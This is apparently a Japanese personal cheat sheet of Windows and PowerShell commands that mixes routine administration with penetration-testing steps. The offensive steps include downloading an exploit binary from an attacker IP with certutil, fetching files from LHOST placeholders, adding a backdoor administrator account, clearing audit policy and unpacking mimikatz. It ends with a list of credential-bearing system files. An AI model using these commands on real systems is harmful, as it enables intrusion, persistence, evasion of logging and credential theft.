# 設定関連
- ## wsl
  - 起動
    - wsl
  - GUIの起動
    - kex --win -m  
![image](https://github.com/user-attachments/assets/082c90bc-4de1-4d81-9e08-b891d717da8d)
# 主要コマンド
- ## Command Prompt
  ### ログオフ
  - logoff
  ### シャットダウン
  - `shutdown -a`
  #### 確認せず実行
  - `shutdown -f`
  - `shutdown -f -r`
  - `shutdown -f -t30`
  - 
  ### 他者の権限でコマンド実行
  #### runas
  - `runas /user:Administrator cmd`
  ##### 認証情報を消さない
  - `runas /user:Administrator /savecred "notepad.exe"`
※通常は使用しない
  ### 名前解決
  #### nslookup
  - `nslookup -type=TXT  ドメイン`
  
  ### ハッシュ値の取得
  #### certutil
  - `certutil -hashfile ファイル名 sha1`
  
  ![image](https://github.com/user-attachments/assets/fc7eb7a4-8a53-47cb-ab03-228bf7e7e4f7)

  ### ファイル関連
  #### ファイル探索
  ##### findstr
  tasklilstから該当するファイル名を表示
    - `C:\>tasklist | findstr CloudMe`
  ##### gc
  ![image](https://github.com/user-attachments/assets/761eb345-177f-4d8d-b461-b8323c1ce99b)

  #### Web
    - certutil
      - certutil -urlcache -f http://10.10.14.2:8000/Chimichurri.exe exploit.exe
        ![image](https://github.com/user-attachments/assets/0e89cadd-d41c-471d-9dae-8fc0d7a61cde)

  #### 監査ポリシー
    - ポリシーの確認
      - auditpol /get /category:*
    - ポリシーの有効化
      -auditpol /set /category:"system","account logon" /success:enable /failure:enable
    - 監査無し
      - auditpol /clear /y
 
  - domainサービス列挙
    - setspn -T ドメイン -F -Q */*
### ユーザ関連
    - ユーザの追加
      - net user hacker hacker123 /add
      - net localgroup Administrators hacker /add
      - net localgroup "Remote Desktop Users" hacker /ADD
    - パスワード変更
```bash
net user hacker newpassword
```
```bash
net user /domain hacker newpassword
``
  - ### コンパイル
    - gcc hello.c -o hello.exe


- ## PowerShell
  - #Select-Object や Where-Object を効果的に使用するためには、オブジェクトが持つプロパティを知っている必要があります。プロパティの一覧を確認する方法はいくつかありますので、それを以下に紹介します。
  - #プロパティの確認方法
    - 1. Get-Member を使用する
         - #Get-Member コマンドレットを使用すると、オブジェクトのプロパティやメソッドの一覧を取得できます。これにより、どのプロパティを使用できるかを確認することができます。
         - #例: プロセスのプロパティを確認する
           - Get-Process | Get-Member
         - #このコマンドを実行すると、Get-Process が返すオブジェクトのプロパティとメソッドのリストが表示されます。
    - 2. Select-Object -Property * を使用する
      - #もう一つの方法として、Select-Object を使ってすべてのプロパティを表示する方法があります。
      - #例: 最初のプロセスのすべてのプロパティを表示する
        - Get-Process | Select-Object -First 1 -Property *
      - #このコマンドは、最初のプロセスのすべてのプロパティを表示します。これにより、利用可能なプロパティを確認できます。
  - #プロパティを確認してからの使用例
    - #例1: Get-Process のプロパティを使用する
    - #まず、プロセスのプロパティを確認します。
      - Get-Process | Get-Member
    - すると、次のようなプロパティが表示されます（一部抜粋）：
      - Name         MemberType Definition
      - ----         ---------- ----------
      - Handles      Property   System.Int32 Handles {get;}
      - Id           Property   System.Int32 Id {get;}
      - Name         Property   System.String Name {get;}
      - CPU          Property   System.Double CPU {get;}
    - これに基づいて、プロセスの名前とCPU使用率を選択できます。
      - Get-Process | Select-Object -Property Name, CPU
    - 例2: Where-Object で条件を指定する
    - #今度は、プロセスのプロパティに基づいてフィルタリングを行います。例えば、CPU使用率が0.1を超えるプロセスを選択します。
      - Get-Process | Where-Object -FilterScript { $_.CPU -gt 0.1 }
    - #まとめ
    - #Select-Object や Where-Object を使用するためには、オブジェクトのプロパティを知っていることが重要です。プロパティを確認するためには、Get-Member や Select-Object -Property * を使用すると便利です。これらのツールを活用して、効率的に必要な情報を抽出しましょう。
  - ### Web
    - Download
      - powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
      - iwr -uri http://lhost/file -Outfile file
      - certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
      - copy \\kali\share\file .
  - ### ファイル操作
    - 解凍
      - Expand-Archive -Path .\mimikatz.zip
  - PowerCLI






# Event Viewer
- Application
- Security
- System
  - シャットダウン開始時刻 (ID 1074)


# その他
- 証明書のインポート
  - #［スタート］→［ファイル名を指定して実行］をクリックし、名前の枠に「certmgr.msc」と入力して［OK］をクリックします。 ...
証明書管理画面が表示されますので、[信頼されたルート証明機関]の証明書フォルダを右クリックして、「すべてのタスク」から「インポート」を選択します

# 重要ファイル一覧
- C:/Users/Administrator/NTUser.dat
- C:/Documents and Settings/Administrator/NTUser.dat
- C:/apache/logs/access.log
- C:/apache/logs/error.log
- C:/apache/php/php.ini
- C:/boot.ini
- C:/inetpub/wwwroot/global.asa
- C:/MySQL/data/hostname.err
- C:/MySQL/data/mysql.err
- C:/MySQL/data/mysql.log
- C:/MySQL/my.cnf
- C:/MySQL/my.ini
- C:/php4/php.ini
- C:/php5/php.ini
- C:/php/php.ini
- C:/Program Files/Apache Group/Apache2/conf/httpd.conf
- C:/Program Files/Apache Group/Apache/conf/httpd.conf
- C:/Program Files/Apache Group/Apache/logs/access.log
- C:/Program Files/Apache Group/Apache/logs/error.log
- C:/Program Files/FileZilla Server/FileZilla Server.xml
- C:/Program Files/MySQL/data/hostname.err
- C:/Program Files/MySQL/data/mysql-bin.log
- C:/Program Files/MySQL/data/mysql.err
- C:/Program Files/MySQL/data/mysql.log
- C:/Program Files/MySQL/my.ini
- C:/Program Files/MySQL/my.cnf
- C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err
- C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log
- C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err
- C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log
- C:/Program Files/MySQL/MySQL Server 5.0/my.cnf
- C:/Program Files/MySQL/MySQL Server 5.0/my.ini
- C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf
- C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf
- C:/Program Files (x86)/Apache Group/Apache/conf/access.log
- C:/Program Files (x86)/Apache Group/Apache/conf/error.log
- C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml
- C:/Program Files (x86)/xampp/apache/conf/httpd.conf
- C:/WINDOWS/php.ini
- C:/WINDOWS/Repair/SAM
- C:/Windows/repair/system
- C:/Windows/repair/software
- C:/Windows/repair/security
#hosts
- C:/WINDOWS/System32/drivers/etc/hosts
- C:/Windows/win.ini
- C:/WINNT/php.ini
- C:/WINNT/win.ini
- C:/xampp/apache/bin/php.ini
- C:/xampp/apache/logs/access.log
- C:/xampp/apache/logs/error.log
- C:/Windows/Panther/Unattend/Unattended.xml
- C:/Windows/Panther/Unattended.xml
- C:/Windows/debug/NetSetup.log
- C:/Windows/system32/config/AppEvent.Evt
- C:/Windows/system32/config/SecEvent.Evt
- C:/Windows/system32/config/default.sav
- C:/Windows/system32/config/security.sav
- C:/Windows/system32/config/software.sav
- C:/Windows/system32/config/system.sav
- C:/Windows/system32/config/regback/default
- C:/Windows/system32/config/regback/sam
- C:/Windows/system32/config/regback/security
- C:/Windows/system32/config/regback/system
- C:/Windows/system32/config/regback/software
- C:/Program Files/MySQL/MySQL Server 5.1/my.ini
- C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml
- C:/Windows/System32/inetsrv/config/applicationHost.config
- C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
